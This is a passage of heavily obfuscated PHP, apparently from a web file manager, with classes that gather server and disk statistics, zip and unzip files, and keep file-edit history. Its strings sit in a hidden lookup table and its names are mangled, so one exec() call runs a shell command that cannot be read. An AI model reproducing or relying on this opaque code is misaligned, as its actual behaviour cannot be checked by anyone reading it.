Model($„ÃÇòÅ«[2073])->where($Ş¿’â•ë)->count($¢Œ›ì„®); return (int) $Ê¾³è¡ú; } private function optionServer() { $ú¹â·ÓÌ =& $_SERVER[ŒÅŸ‹ä†]; $’­´ÚÇª = $this->diskDriver(); $×Ô¬—Êô = KodIO::defaultDriver(); $òÄÆÎÁõ = array($ú¹â·ÓÌ[922] => $×Ô¬—Êô[$ú¹â·ÓÌ[492]]); $¥ƒ»’„ = Model($ú¹â·ÓÌ[565])->where($òÄÆÎÁõ)->sum($ú¹â·ÓÌ[89]); $Ò Ÿ÷áØ = explode($ú¹â·ÓÌ[63], $_SERVER[$ú¹â·ÓÌ[155]]); $Ò¶Š½Öá = $Ò Ÿ÷áØ[0]; $Éä‹Ü¿í = $GLOBALS[$ú¹â·ÓÌ[6]][$ú¹â·ÓÌ[31]]; $È¿ÚÅˆ = $Éä‹Ü¿í[$ú¹â·ÓÌ[1087]]; if ($È¿ÚÅˆ == $ú¹â·ÓÌ[1075]) { $€ìğêÏØ = explode($ú¹â·ÓÌ[1417], $Éä‹Ü¿í[$ú¹â·ÓÌ[1086]]); $È¿ÚÅˆ = $€ìğêÏØ[0]; } if ($È¿ÚÅˆ == $ú¹â·ÓÌ[1023] || $È¿ÚÅˆ == $ú¹â·ÓÌ[900]) { $Â²Ìö‘ä = Model()->db()->query($ú¹â·ÓÌ[2110]); $•³õÔ¨± = $Â²Ìö‘ä[0] && isset($Â²Ìö‘ä[0][$ú¹â·ÓÌ[1807]]) ? $Â²Ìö‘ä[0][$ú¹â·ÓÌ[1807]] : 0; $È¿ÚÅˆ = $ú¹â·ÓÌ[2111] . ($•³õÔ¨± ? $ú¹â·ÓÌ[8] . $•³õÔ¨± : $ú¹â·ÓÌ[12]); } $«Ëš˜Ö¡ = $GLOBALS[$ú¹â·ÓÌ[6]][$ú¹â·ÓÌ[434]][$ú¹â·ÓÌ[931]]; return array($ú¹â·ÓÌ[2112] => $’­´ÚÇª ? $’­´ÚÇª[$ú¹â·ÓÌ[2113]] : 0, $ú¹â·ÓÌ[2114] => $’­´ÚÇª ? $’­´ÚÇª[$ú¹â·ÓÌ[2115]] : 0, $ú¹â·ÓÌ[2116] => (int) $×Ô¬—Êô[$ú¹â·ÓÌ[2113]] * 1024 * 1024 * 1024, $ú¹â·ÓÌ[2117] => (int) $¥ƒ»’„, $ú¹â·ÓÌ[2118] => ucfirst($Ò¶Š½Öá), $ú¹â·ÓÌ[2119] => $ú¹â·ÓÌ[2120] . PHP_VERSION, $ú¹â·ÓÌ[2121] => phpBuild64() ? 64 : 32, $ú¹â·ÓÌ[854] => str_replace($ú¹â·ÓÌ[1249], $ú¹â·ÓÌ[1103], $È¿ÚÅˆ), $ú¹â·ÓÌ[434] => ucfirst($«Ëš˜Ö¡), $ú¹â·ÓÌ[42] => $_SERVER[$ú¹â·ÓÌ[2122]]); } private function diskDriver() { $ å›¡ë =& $_SERVER[ŒÅŸ‹ä†]; $’§éíšò = $ å›¡ë[8]; $¢§â¤¯¨ = $GLOBALS[$ å›¡ë[6]][$ å›¡ë[1441]] == $ å›¡ë[1442]; if ($¢§â¤¯¨) { $’§éíšò = $ å›¡ë[2123]; if (function_exists($ å›¡ë[2124])) { exec($ å›¡ë[2125], $çˆÅş); $’§éíšò = $çˆÅş[1] . $ å›¡ë[8]; } } if (!file_exists($’§éíšò)) { return; } if (!function_exists($ å›¡ë[2126])) { return; } $ÀÓ³Ú…ö = @disk_total_space($’§éíšò); $İññ¹ññ = $ÀÓ³Ú…ö - @disk_free_space($’§éíšò); return array($ å›¡ë[2113] => $ÀÓ³Ú…ö, $ å›¡ë[2115] => $İññ¹ññ); } public function fileChart($¦÷ÁÉ­é) { $Â²îöÔÂ =& $_SERVER[ŒÅŸ‹ä†]; if (isset($¦÷ÁÉ­é[$Â²îöÔÂ[1537]])) { return Model($Â²îöÔÂ[929])->userFileTypeProfile($¦÷ÁÉ­é[$Â²îöÔÂ[1537]]); } if (isset($¦÷ÁÉ­é[$Â²îöÔÂ[1439]])) { return Model($Â²îöÔÂ[929])->groupFileTypeProfile($¦÷ÁÉ­é[$Â²îöÔÂ[1439]]); } $ğ×æñ× = $this->sourceSize(); $¼«¸Ü˜Ò = array($Â²îöÔÂ[201] => 0, $Â²îöÔÂ[199] => 1); $Ÿ˜¡ÖûË = Model($Â²îöÔÂ[929])->where($¼«¸Ü˜Ò)->sum($Â²îöÔÂ[89]); $¼«¸Ü˜Ò[$Â²îöÔÂ[199]] = 2; $Âûˆ‡ “ = Model($Â²îöÔÂ[929])->where($¼«¸Ü˜Ò)->sum($Â²îöÔÂ[89]); return array($Â²îöÔÂ[860] => $ğ×æñ×[$Â²îöÔÂ[89]], $Â²îöÔÂ[2063] => $ğ×æñ×[$Â²îöÔÂ[2063]], $Â²îöÔÂ[2064] => (int) $Ÿ˜¡ÖûË, $Â²îöÔÂ[2065] => (int) $Âûˆ‡ “); } private function sourceSize() { $õÊ‰ĞÔŠ =& $_SERVER[ŒÅŸ‹ä†]; $°­û¡Ã = Model($õÊ‰ĞÔŠ[929])->where(array($õÊ‰ĞÔŠ[505] => 0))->sum($õÊ‰ĞÔŠ[89]); $”ÆÎâºÅ = Model($õÊ‰ĞÔŠ[565])->sum($õÊ‰ĞÔŠ[89]); if ($”ÆÎâºÅ > $°­û¡Ã) { $”ÆÎâºÅ = $°­û¡Ã; } return array($õÊ‰ĞÔŠ[89] => (int) $°­û¡Ã, $õÊ‰ĞÔŠ[2063] => (int) $”ÆÎâºÅ); } } goto eĞ±Û»ï½; A‰—ãĞôö¥: class IOArchive extends IO { function __construct() { parent::__construct(); } private static function local() { static $Å«ãäÙ; if ($Å«ãäÙ) { return $Å«ãäÙ; } $ŸÚŞÇƒü = IO::init($_SERVER[ŒÅŸ‹ä†][8]); return $ŸÚŞÇƒü; } private static function iconvSystem($†´Õ¤Ë£) { return self::local()->iconvSystem($†´Õ¤Ë£); } private static function iconvApp($¿ãâÚµÃ) { return self::local()->iconvApp($¿ãâÚµÃ); } public static function zipFolder($ÀĞ¥µé±, $óòÍÓù— = "\x7a\151\x70", $³±€Í€ü = '', $Í´”÷¥ú = REPEAT_RENAME) { $‚üßÓ‰Ğ =& $_SERVER[ŒÅŸ‹ä†]; $šñ¢ß± = IO::listPath($ÀĞ¥µé±); if (!$šñ¢ß±) { return !1; } $šñ¢ß± = array_merge($šñ¢ß±[$‚üßÓ‰Ğ[95]], $šñ¢ß±[$‚üßÓ‰Ğ[96]]); return self::zip($šñ¢ß±, $óòÍÓù—, $³±€Í€ü, $Í´”÷¥ú); } public static function zip($×ô¦é¹¬, $µ«ˆæÁ = "\x7a\x69\160", $¬¾’ÏÏ = '', $¬¿ËÓÍ = REPEAT_RENAME) { $åöÏ–ËÃ =& $_SERVER[ŒÅŸ‹ä†]; if (is_string($×ô¦é¹¬) && $×ô¦é¹¬) { $×ô¦é¹¬ = array(array($åöÏ–ËÃ[97] => $×ô¦é¹¬)); } $Èù¸›Úö = self::init($×ô¦é¹¬[0][$åöÏ–ËÃ[97]]); $”½µµùç = self::info($×ô¦é¹¬[0][$åöÏ–ËÃ[97]]); $Êßƒ“• = $åöÏ–ËÃ[12]; $”áÁğ³‚ = $åöÏ–ËÃ[12]; $Úˆ­ıá” = $åöÏ–ËÃ[12]; if ($¬¾’ÏÏ && substr($¬¾’ÏÏ, -1, 1) != $åöÏ–ËÃ[8]) { $”áÁğ³‚ = get_path_father($¬¾’ÏÏ); $Úˆ­ıá” = get_path_this($¬¾’ÏÏ); } else { $”áÁğ³‚ = self::pathFather($”½µµùç[$åöÏ–ËÃ[97]]); $Úˆ­ıá” = $”½µµùç[$åöÏ–ËÃ[42]] . $åöÏ–ËÃ[10] . $µ«ˆæÁ; if (count($×ô¦é¹¬) > 1) { $¢šüŞÛ¸ = IO::info($”áÁğ³‚); $Úˆ­ıá” = $¢šüŞÛ¸[$åöÏ–ËÃ[42]] . $åöÏ–ËÃ[10] . $µ«ˆæÁ; } if ($¬¾’ÏÏ) { $”áÁğ³‚ = $¬¾’ÏÏ; } } if ($Èù¸›Úö->getType() == $åöÏ–ËÃ[117]) { $»âöëÃº = self::init($”áÁğ³‚); $Ö…™¼¹ = $»âöëÃº->getType() == $åöÏ–ËÃ[117] ? $”áÁğ³‚ : get_path_father($Èù¸›Úö->path); $Ö…™¼¹ = IO::getPathInner($Ö…™¼¹); $Ö…™¼¹ = rtrim($Ö…™¼¹, $åöÏ–ËÃ[8]) . $åöÏ–ËÃ[8]; mk_dir($Ö…™¼¹); } else { $Êßƒ“• = TEMP_FILES . $åöÏ–ËÃ[1313] . time() . rand_string(8) . $åöÏ–ËÃ[8]; mk_dir($Êßƒ“•); file_put_contents($Êßƒ“• . $åöÏ–ËÃ[1314], $åöÏ–ËÃ[12]); $Ö…™¼¹ = $Êßƒ“•; } $øóîÊßœ = IO::info($Ö…™¼¹); if (!$øóîÊßœ || !$øóîÊßœ[$åöÏ–ËÃ[244]]) { show_json(LNG($åöÏ–ËÃ[1315]), !1); } $åüÆ´ù¥ = self::zipFileList($×ô¦é¹¬, $Êßƒ“•); foreach ($åüÆ´ù¥ as $Í—óÊ´‰ => $ÔåïëÒÍ) { $åüÆ´ù¥[$Í—óÊ´‰] = self::iconvSystem($ÔåïëÒÍ); } $ì Å¸‡¡ = get_filename_auto($Ö…™¼¹ . $Úˆ­ıá”, $åöÏ–ËÃ[12], $¬¿ËÓÍ); KodArchive::create(self::iconvSystem($ì Å¸‡¡), $åüÆ´ù¥); if (!IO::exist($ì Å¸‡¡)) { if ($Êßƒ“•) { del_dir($Êßƒ“•); } write_log($åöÏ–ËÃ[1316] . $ì Å¸‡¡, $åöÏ–ËÃ[398]); show_json(LNG($åöÏ–ËÃ[1317]), !1); } if (!$Êßƒ“•) { return $ì Å¸‡¡; } $çå—ûÜ¤ = self::move($ì Å¸‡¡, $”áÁğ³‚, $¬¿ËÓÍ); if ($Êßƒ“•) { del_dir($Êßƒ“•); } if (!$ì Å¸‡¡) { write_log($åöÏ–ËÃ[1318] . $ì Å¸‡¡ . $åöÏ–ËÃ[1319] . $”áÁğ³‚, $åöÏ–ËÃ[398]); show_json(LNG($åöÏ–ËÃ[1317]), !1); } return $çå—ûÜ¤; } public static function unzip($±Ğù‰½ı, $êàÓöÒ, $ìô€€²¶ = "\x2d\x31", $…ÎÍùâ = "\x72\145\x70\154\x61\x63\145") { $Ï¥è×ÃÌ =& $_SERVER[ŒÅŸ‹ä†]; $ïñíƒùƒ = parent::info($±Ğù‰½ı); if (!$ïñíƒùƒ) { show_json(LNG($Ï¥è×ÃÌ[1320]), !1); } $ÛëŸâÉ¾ = IO::infoFullSimple($êàÓöÒ); if (!$ÛëŸâÉ¾) { $êàÓöÒ = IO::mkdir($êàÓöÒ); } if (isset($ÛëŸâÉ¾[$Ï¥è×ÃÌ[202]]) && trim($ÛëŸâÉ¾[$Ï¥è×ÃÌ[97]], $Ï¥è×ÃÌ[8]) != trim($êàÓöÒ, $Ï¥è×ÃÌ[8])) { $ê—¾æŞƒ = KodIO::make($ÛëŸâÉ¾[$Ï¥è×ÃÌ[201]]); $““ …®Õ = IO::fileNameAuto($ê—¾æŞƒ, $ÛëŸâÉ¾[$Ï¥è×ÃÌ[42]], REPEAT_RENAME_FOLDER, !0); $êàÓöÒ = IO::mkdir($ê—¾æŞƒ . $““ …®Õ); } $ìô€€²¶ = $ìô€€²¶ && $ìô€€²¶ != $Ï¥è×ÃÌ[1321] ? @json_decode($ìô€€²¶, !0) : -1; $ì“¿ıÍÛ = self::unzipPart($±Ğù‰½ı, $ìô€€²¶); if (!$ì“¿ıÍÛ || !IO::exist($ì“¿ıÍÛ[$Ï¥è×ÃÌ[241]])) { show_json(LNG($Ï¥è×ÃÌ[116]), !1); } $§ùÉ–å¡ = $ì“¿ıÍÛ[$Ï¥è×ÃÌ[1322]][count($ì“¿ıÍÛ[$Ï¥è×ÃÌ[1322]]) - 1]; if ($§ùÉ–å¡[$Ï¥è×ÃÌ[1250]] == -1 || substr($§ùÉ–å¡[$Ï¥è×ÃÌ[42]], -1, 1) == $Ï¥è×ÃÌ[8]) { $Ğã¬ÖÀ× = $ì“¿ıÍÛ[$Ï¥è×ÃÌ[1323]] . rand_string(10) . $Ï¥è×ÃÌ[8]; mk_dir($Ğã¬ÖÀ×); $†ÚØ³Õ™ = count($ì“¿ıÍÛ[$Ï¥è×ÃÌ[1322]]) == 1 ? IO::ext($±Ğù‰½ı) : get_path_ext($ì“¿ıÍÛ[$Ï¥è×ÃÌ[241]]); $ê—™©³ = KodArchive::extract(self::iconvSystem($ì“¿ıÍÛ[$Ï¥è×ÃÌ[241]]), $Ğã¬ÖÀ×, $§ùÉ–å¡[$Ï¥è×ÃÌ[1250]], $““ …®Õ, $†ÚØ³Õ™); self::unzipErrorCheck($ê—™©³, array($Ï¥è×ÃÌ[1324], $±Ğù‰½ı, $†ÚØ³Õ™, $êàÓöÒ, $ì“¿ıÍÛ)); Hook::trigger($Ï¥è×ÃÌ[1325], $Ğã¬ÖÀ×); recursion_dir($Ğã¬ÖÀ×, $ƒ¬è‰Å˜, $ò®·â, 0); $­™Ã³•ñ = array_merge($ƒ¬è‰Å˜, $ò®·â); $­î©‡œ£ = array(); foreach ($­™Ã³•ñ as $²¡©¦–´) { $ÏÜÀ¥‚¦ = IO::move(self::iconvApp($²¡©¦–´), $êàÓöÒ, $…ÎÍùâ); if ($ÏÜÀ¥‚¦) { $­î©‡œ£[] = $ÏÜÀ¥‚¦; } } del_dir($Ğã¬ÖÀ×); } else { $ÏÜÀ¥‚¦ = IO::move($ì“¿ıÍÛ[$Ï¥è×ÃÌ[241]], $êàÓöÒ, $…ÎÍùâ, get_path_this($§ùÉ–å¡[$Ï¥è×ÃÌ[42]])); if ($ÏÜÀ¥‚¦) { $­î©‡œ£[] = $ÏÜÀ¥‚¦; } } return $­î©‡œ£ ? $­î©‡œ£ : !1; } public static function unzipList($Ô»÷ÉÏ) { $·ã«¿Œˆ =& $_SERVER[ŒÅŸ‹ä†]; $îõƒ¬‚ì = isset($Ô»÷ÉÏ[$·ã«¿Œˆ[1326]]) ? $Ô»÷ÉÏ[$·ã«¿Œˆ[1326]] : !1; $Ä°İáÂò = isset($Ô»÷ÉÏ[$·ã«¿Œˆ[1250]]) ? @json_decode($Ô»÷ÉÏ[$·ã«¿Œˆ[1250]], !0) : -1; $şÖùéÃ = self::unzipPart($Ô»÷ÉÏ[$·ã«¿Œˆ[97]], $Ä°İáÂò); if (!$şÖùéÃ || !IO::exist($şÖùéÃ[$·ã«¿Œˆ[241]])) { show_json(LNG($·ã«¿Œˆ[116]), !1); } $Éˆñ¢©õ = $şÖùéÃ[$·ã«¿Œˆ[1322]][count($şÖùéÃ[$·ã«¿Œˆ[1322]]) - 1]; $ˆ±§ûÏŞ = in_array(IO::ext($şÖùéÃ[$·ã«¿Œˆ[241]]), array($·ã«¿Œˆ[398], $·ã«¿Œˆ[1327], $·ã«¿Œˆ[1328], $·ã«¿Œˆ[1329], $·ã«¿Œˆ[1330], $·ã«¿Œˆ[1331])); if (!$îõƒ¬‚ì && ($Éˆñ¢©õ[$·ã«¿Œˆ[1250]] == -1 || $ˆ±§ûÏŞ)) { $Ğ×ùÉµè = $şÖùéÃ[$·ã«¿Œˆ[1323]] . get_path_this($şÖùéÃ[$·ã«¿Œˆ[241]]) . $·ã«¿Œˆ[1332]; if (!IO::exist($Ğ×ùÉµè)) { $©Üˆá†Ç = $Éˆñ¢©õ[$·ã«¿Œˆ[1250]] == -1 ? get_path_ext(IO::pathThis($Ô»÷ÉÏ[$·ã«¿Œˆ[97]])) : get_path_ext($şÖùéÃ[$·ã«¿Œˆ[241]]); $Ì÷şÃææ = KodArchive::listContent(self::iconvSystem($şÖùéÃ[$·ã«¿Œˆ[241]]), !0, $©Üˆá†Ç); self::unzipErrorCheck($Ì÷şÃææ, array($·ã«¿Œˆ[1333], $Ô»÷ÉÏ, $şÖùéÃ)); @file_put_contents($Ğ×ùÉµè, json_encode($Ì÷şÃææ[$·ã«¿Œˆ[1334]])); } return @json_decode(IO::getContent($Ğ×ùÉµè), !0); } IO::fileOut($şÖùéÃ[$·ã«¿Œˆ[241]], $îõƒ¬‚ì, get_path_this($Éˆñ¢©õ[$·ã«¿Œˆ[42]])); die; } private static function zipFileList($ƒíãìÖ«, $¦ ©†Ÿ = false) { $äÆØÙ± =& $_SERVER[ŒÅŸ‹ä†]; $Ì°ì¾½¹ = array(); foreach ($ƒíãìÖ« as $¤˜ÛÉçÜ) { $ÑæË ‚Õ = $¤˜ÛÉçÜ[$äÆØÙ±[97]]; if ($¦ ©†Ÿ) { $ÑæË ‚Õ = self::copy($¤˜ÛÉçÜ[$äÆØÙ±[97]], $¦ ©†Ÿ, $äÆØÙ±[923]); } else { $©“Èù’÷ = self::init($¤˜ÛÉçÜ[$äÆØÙ±[97]]); if ($©“Èù’÷->getType() == $äÆØÙ±[117]) { $ÑæË ‚Õ = $©“Èù’÷->path; } } if ($ÑæË ‚Õ && self::local()->exist($ÑæË ‚Õ)) { $Ì°ì¾½¹[$¤˜ÛÉçÜ[$äÆØÙ±[97]]] = $ÑæË ‚Õ; } } if (!empty($Ì°ì¾½¹)) { return array_values($Ì°ì¾½¹); } show_json(LNG($äÆØÙ±[1292]), !1); } private static function localFilePath($Û½äˆëâ) { $¤×şÇƒ† =& $_SERVER[ŒÅŸ‹ä†]; $¤ÂÉ¨Ú = KodIO::parse($Û½äˆëâ); if ($¤ÂÉ¨Ú[$¤×şÇƒ†[43]] == KodIO::KOD_SOURCE) { $Â¨›€ÓÆ = Model($¤×şÇƒ†[929])->fileInfoGet(KodIO::sourceID($Û½äˆëâ)); if (!$Â¨›€ÓÆ[$¤×şÇƒ†[97]]) { show_json($¤×şÇƒ†[1335], !1); } $Û½äˆëâ = $Â¨›€ÓÆ[$¤×şÇƒ†[97]]; } $ïŞ³¸ÙÏ = self::init($Û½äˆëâ); if ($ïŞ³¸ÙÏ->pathParse[$¤×şÇƒ†[1278]]) { $Û½äˆëâ = $ïŞ³¸ÙÏ->pathParse[$¤×şÇƒ†[1278]]; $ïŞ³¸ÙÏ = self::init($Û½äˆëâ); } $ù¥­ñ—¼ = $ïŞ³¸ÙÏ->getType(); if ($ù¥­ñ—¼ == $¤×şÇƒ†[117] || $ù¥­ñ—¼ == $¤×şÇƒ†[1336]) { if (!$ïŞ³¸ÙÏ->exist($ïŞ³¸ÙÏ->path)) { show_json(LNG($¤×şÇƒ†[116]), !1); } return $ïŞ³¸ÙÏ->path; } return !1; } public static function unzipPart($Ù˜•¯­µ, $ô±ôõ¨» = -1) { $åî»´‹ =& $_SERVER[ŒÅŸ‹ä†]; $ü§ÙÔõì = IO::pathThis($Ù˜•¯­µ); if (!$ô±ôõ¨» || $ô±ôõ¨» == -1) { $ Õ‹‘®Ï = array(array($åî»´‹[42] => $ü§ÙÔõì, $åî»´‹[1250] => -1)); $ Õ‹‘®Ï[0][$åî»´‹[1337]] = $ Õ‹‘®Ï[0][$åî»´‹[42]]; } else { if (is_array($ô±ôõ¨»)) { $ Õ‹‘®Ï = $ô±ôõ¨»; $á‡‡ëíø = count($ Õ‹‘®Ï) - 1; for ($ÑÎĞŸÈ = 0; $ÑÎĞŸÈ <= $á‡‡ëíø; $ÑÎĞŸÈ++) { $èÍÄ¦Š¥ = $ Õ‹‘®Ï[$ÑÎĞŸÈ]; $á…çöÉÉ = get_path_this($èÍÄ¦Š¥[$åî»´‹[42]]) . (checkExtSafe($èÍÄ¦Š¥[$åî»´‹[42]]) ? $åî»´‹[12] : $åî»´‹[1338]); $ Õ‹‘®Ï[$ÑÎĞŸÈ][$åî»´‹[1337]] = $åî»´‹[1339] . intval($èÍÄ¦Š¥[$åî»´‹[1250]]) . $åî»´‹[482] . $á…çöÉÉ; if ($ÑÎĞŸÈ == 0) { continue; } $ Õ‹‘®Ï[$ÑÎĞŸÈ][$åî»´‹[1337]] = $ Õ‹‘®Ï[$ÑÎĞŸÈ - 1][$åî»´‹[1337]] . $åî»´‹[1340] . $ Õ‹‘®Ï[$ÑÎĞŸÈ][$åî»´‹[1337]]; } } } if (!is_array($ Õ‹‘®Ï) || count($ Õ‹‘®Ï) == 0) { return !1; } $ªÙºÃ¡˜ = $ Õ‹‘®Ï[count($ Õ‹‘®Ï) - 1]; if (!IO::exist($Ù˜•¯­µ)) { return !1; } $›ÔÌ–ş = TEMP_FILES . $åî»´‹[1341] . kodIO::hashPathSafe($Ù˜•¯­µ) . $åî»´‹[8]; $Æ•¤ŒèÉ = $›ÔÌ–ş . $ªÙºÃ¡˜[$åî»´‹[1337]]; mk_dir($›ÔÌ–ş); file_put_contents(TEMP_FILES . $åî»´‹[1314], $åî»´‹[12]); if (IO::exist($Æ•¤ŒèÉ)) { return array($åî»´‹[241] => $Æ•¤ŒèÉ, $åî»´‹[1322] => $ Õ‹‘®Ï, $åî»´‹[1323] => $›ÔÌ–ş); } $áÏôé£“ = self::localFilePath($Ù˜•¯­µ); if (!$áÏôé£“) { $áÏôé£“ = $›ÔÌ–ş . $åî»´‹[1342]; if (!IO::exist($áÏôé£“)) { self::copy($Ù˜•¯­µ, $›ÔÌ–ş, !1, get_path_this($áÏôé£“)); } } if (!$áÏôé£“ || !IO::exist($áÏôé£“)) { return !1; } if ($ªÙºÃ¡˜[$åî»´‹[1250]] == -1) { return array($åî»´‹[241] => $áÏôé£“, $åî»´‹[1322] => $ Õ‹‘®Ï, $åî»´‹[1323] => $›ÔÌ–ş); } $Ëï³É…Õ = $áÏôé£“; foreach ($ Õ‹‘®Ï as $ÑÎĞŸÈ => $èÍÄ¦Š¥) { if (!$èÍÄ¦Š¥ || $èÍÄ¦Š¥[$åî»´‹[1250]] == $åî»´‹[1321]) { break; } if (substr($èÍÄ¦Š¥[$åî»´‹[42]], -1, 1) == $åî»´‹[8]) { break; } $µë»ıÛí = in_array(get_path_ext($èÍÄ¦Š¥[$åî»´‹[1337]]), array($åî»´‹[398], $åî»´‹[1327], $åî»´‹[1328], $åî»´‹[1329], $åî»´‹[1330], $åî»´‹[1331])); $©Şƒ¤ ‚ = $ÑÎĞŸÈ == count($ Õ‹‘®Ï) - 1 && $µë»ıÛí; $”ŞİÎè‰ = $›ÔÌ–ş . $èÍÄ¦Š¥[$åî»´‹[1337]]; $ŞÛ›Êû€ = $›ÔÌ–ş . get_path_this($èÍÄ¦Š¥[$åî»´‹[42]]); if (IO::exist($”ŞİÎè‰)) { $Ëï³É…Õ = $”ŞİÎè‰; continue; } $õê¾²ë– = $ÑÎĞŸÈ == 0 ? get_path_ext($ü§ÙÔõì) : get_path_ext($Ëï³É…Õ); $÷½¥ç ‚ = KodArchive::extract(self::iconvSystem($Ëï³É…Õ), $›ÔÌ–ş, $èÍÄ¦Š¥[$åî»´‹[1250]], $¸ü¤À‘, $õê¾²ë–); self::unzipErrorCheck($÷½¥ç ‚, array($åî»´‹[1343], $Ù˜•¯­µ, $ Õ‹‘®Ï, $èÍÄ¦Š¥, $”ŞİÎè‰)); if (IO::exist($ŞÛ›Êû€)) { IO::rename($ŞÛ›Êû€, get_path_this($”ŞİÎè‰)); } $Ëï³É…Õ = $”ŞİÎè‰; } $Æ•¤ŒèÉ = $Ëï³É…Õ; return array($åî»´‹[241] => $Ëï³É…Õ, $åî»´‹[1322] => $ Õ‹‘®Ï, $åî»´‹[1323] => $›ÔÌ–ş); } private static function unzipErrorCheck($ĞëŠú•—, $©  Ä´ = false) { $Õ©÷¢Ë =& $_SERVER[ŒÅŸ‹ä†]; if ($ĞëŠú•—[$Õ©÷¢Ë[1344]]) { return !0; } write_log(array($Õ©÷¢Ë[1345], $ĞëŠú•—, $©  Ä´), $Õ©÷¢Ë[1346]); $Š«â£í© = is_array($ĞëŠú•—[$Õ©÷¢Ë[1334]]) ? json_encode($ĞëŠú•—[$Õ©÷¢Ë[1334]]) : $ĞëŠú•—[$Õ©÷¢Ë[1334]]; show_json($Õ©÷¢Ë[1347] . $Š«â£í©, !1); die; } } class IOHistory { public static $_historyBase = ''; function __construct() { } public static function bindEvent() { $šé«Š‚‘ =& $_SERVER[ŒÅŸ‹ä†]; $®Ü½‘«Ö = $GLOBALS[$šé«Š‚‘[6]][$šé«Š‚‘[102]]; if ($®Ü½‘«Ö[$šé«Š‚‘[1348]] != 1) { return; } if ($®Ü½‘«Ö[$šé«Š‚‘[1349]] <= 0) { return; } if (isset($_REQUEST[$šé«Š‚‘[1350]]) && $_REQUEST[$šé«Š‚‘[1350]] == $šé«Š‚‘[101]) { return; } Hook::bind($šé«Š‚‘[1351], $šé«Š‚‘[1352]); Hook::bind($šé«Š‚‘[1353], $šé«Š‚‘[1354]); Hook::bind($šé«Š‚‘[1355], $šé«Š‚‘[1356]); Hook::bind($šé«Š‚‘[1357], $šé«Š‚‘[1358]); Hook::bind($šé«Š‚‘[1359], $šé«Š‚‘[1360]); Hook::bind($šé«Š‚‘[1361], $šé«Š‚‘[1362]); } public static function eventBeforeUpload($Îğï¼Ì) { if ($Îğï¼Ì[3] && $Îğï¼Ì[3] != REPEAT_REPLACE) { return; } $…ı¿ºùÉ = self::parsePath($Îğï¼Ì[0]); if (!$…ı¿ºùÉ) { return; } self::add($…ı¿ºùÉ); } public static function eventBeforeEdit($ŒÅü“à˜) { $¸®´íéª = self::parsePath($ŒÅü“à˜[0]); if (!$¸®´íéª) { return; } self::add($¸®´íéª); } public static function eventBeforeCopyFile($ĞÙˆÙƒ, $’Á±£†, $Õ•µ¯Íş, $Çä¯Ô¯Ñ, $º›À‹äƒ, $´úæı¦æ) { $ºÏ¡ç¶ =& $_SERVER[ŒÅŸ‹ä†]; if (isset($Õ•µ¯Íş->_data[$ºÏ¡ç¶[1282]]) && $Õ•µ¯Íş->_data[$ºÏ¡ç¶[1282]]) { return; } $è ƒ½ÍÁ = $Õ•µ¯Íş->getPathOuter($Çä¯Ô¯Ñ); $¡Íò›Ò = self::parsePath($è ƒ½ÍÁ); if (!$¡Íò›Ò) { return; } self::add($¡Íò›Ò); } public static function eventBeforeRename($İë‚Õ‡¡) { $‚à’ä‡¬ =& $_SERVER[ŒÅŸ‹ä†]; $ó£ü¦§¤ = self::parsePath($İë‚Õ‡¡[0]); if (!$ó£ü¦§¤) { return; } $Ï²òß¥Ÿ = self::checkInHistory($ó£ü¦§¤); if (!$Ï²òß¥Ÿ) { return; } if ($Ï²òß¥Ÿ[$‚à’ä‡¬[43]] == $‚à’ä‡¬[241]) { $üûÔ½êş = self::listData($ó£ü¦§¤); if ($üûÔ½êş && $üûÔ½êş[$‚à’ä‡¬[455]]) { self::moveHistory($ó£ü¦§¤, $İë‚Õ‡¡[1]); } } else { IO::rename($Ï²òß¥Ÿ[$‚à’ä‡¬[97]], $İë‚Õ‡¡[1]); } } public static function eventBeforeMove($õ¾”¡éŸ) { $Á¤¿„°Ù =& $_SERVER[ŒÅŸ‹ä†]; $ÁÅùá§‚ = self::parsePath($õ¾”¡éŸ[0]); if (!$ÁÅùá§‚) { return; } $ŞÊèÏ“ = self::parsePath($õ¾”¡éŸ[1]); if (!$ŞÊèÏ“) { return; } $Õ¯Â¥í = $õ¾”¡éŸ[3]; $‘Ê çµ = self::checkInHistory($ÁÅùá§‚); if (!$‘Ê çµ) { return; } $š¦²ßÇª = self::pathHistory($ŞÊèÏ“); if ($‘Ê çµ[$Á¤¿„°Ù[43]] == $Á¤¿„°Ù[241]) { $Ä£Ï¤ØÂ = self::listData($ÁÅùá§‚); $•«Á—£ô = rtrim($ŞÊèÏ“, $Á¤¿„°Ù[8]) . $Á¤¿„°Ù[8] . ($Õ¯Â¥í ? $Õ¯Â¥í : get_path_this($ÁÅùá§‚)); $èÅÄî­ = self::listData($•«Á—£ô); if ($Ä£Ï¤ØÂ && $Ä£Ï¤ØÂ[$Á¤¿„°Ù[455]] && $èÅÄî­ && $èÅÄî­[$Á¤¿„°Ù[455]]) { return self::clear($ÁÅùá§‚); } if ($Ä£Ï¤ØÂ && $Ä£Ï¤ØÂ[$Á¤¿„°Ù[455]]) { self::moveHistory($ÁÅùá§‚, $Õ¯Â¥í, $š¦²ßÇª); } } else { IO::move($‘Ê çµ[$Á¤¿„°Ù[97]], $š¦²ßÇª, !1, $Õ¯Â¥í); self::clearEmptyFolder(IO::pathFather($‘Ê çµ[$Á¤¿„°Ù[97]])); } } public static function eventAfterRemove($¯öûøˆ¾, $óŸĞåó) { $ŒĞˆğÕ™ =& $_SERVER[ŒÅŸ‹ä†]; if (!$óŸĞåó) { return; } $¶€îç†Â = self::parsePath($¯öûøˆ¾[0]); if (!$¶€îç†Â) { return; } $îëéªÅË = self::checkInHistory($¶€îç†Â); if (!$îëéªÅË) { return; } if ($îëéªÅË[$ŒĞˆğÕ™[43]] == $ŒĞˆğÕ™[241]) { $°¨û·²ò = self::listData($¶€îç†Â, !1); if ($°¨û·²ò && $°¨û·²ò[$ŒĞˆğÕ™[455]]) { self::clear($¶€îç†Â, !1); } } else { IO::remove($îëéªÅË[$ŒĞˆğÕ™[97]]); self::clearEmptyFolder(IO::pathFather($îëéªÅË[$ŒĞˆğÕ™[97]])); } } private static function checkInHistory($†ÒÄ¥ø¢) { $ÇÅÚ†³Ù = self::pathHistory($†ÒÄ¥ø¢); if (!IO::exist($ÇÅÚ†³Ù)) { $ÇÅÚ†³Ù .= $_SERVER[ŒÅŸ‹ä†][1363]; } return IO::exist($ÇÅÚ†³Ù) ? IO::info($ÇÅÚ†³Ù) : !1; } private static function parsePath($ñŞ´¨ˆ“) { $”ÂúŒÊ¿ =& $_SERVER[ŒÅŸ‹ä†]; if (!$ñŞ´¨ˆ“) { return !1; } if 